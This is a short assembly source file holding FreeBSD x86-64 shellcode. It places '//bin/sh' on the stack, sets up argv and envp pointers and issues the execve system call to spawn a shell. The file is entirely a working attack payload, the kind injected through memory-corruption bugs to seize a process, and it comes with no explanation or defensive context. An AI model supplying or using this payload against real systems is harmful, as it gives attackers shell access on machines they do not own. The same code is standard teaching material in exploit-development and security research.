; FreeBSD x86-64 execve /bin/sh shellcode

section .text
global _start
_start:
    ; execve("/bin/sh", NULL, NULL) - FreeBSD syscall convention
    ; FreeBSD uses syscall numbers with arguments on stack (legacy) or registers
    xor    eax, eax
    push   rax              ; NULL terminator
    mov    rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    push   rbx
    mov    rdi, rsp         ; pathname ptr
    push   rax
    mov    rdx, rsp         ; envp = NULL
    push   rdi
    mov    rsi, rsp         ; argv = ["/bin/sh", NULL]
    mov    eax, 59          ; SYS_execve on FreeBSD x86-64
    syscall
